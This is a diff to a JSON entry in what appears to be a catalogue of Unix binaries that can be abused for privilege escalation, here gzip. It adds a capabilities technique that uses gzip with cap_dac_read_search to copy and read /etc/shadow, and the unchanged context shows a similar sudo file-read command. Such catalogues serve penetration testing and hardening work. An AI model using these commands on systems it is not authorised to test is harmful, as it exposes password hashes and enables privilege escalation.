@@ -21,6 +21,12 @@
         
         "code": "LFILE=file_to_read\nsudo gzip -f $LFILE -t\n"
       }
+    ],
+    "capabilities": [
+      {
+        "description": "If cap_dac_read_search is set. Run ``getcap -r / 2>/dev/null`` to confirm ``/usr/bin/gzip cap_dac_read_search=ep``",
+        "code": "gzip can read any file:\ngzip -c /etc/shadow > /tmp/shadow.gz\ngzip -d /tmp/shadow.gz\ncat /tmp/shadow\n"
+      }
     ]
   }
 }
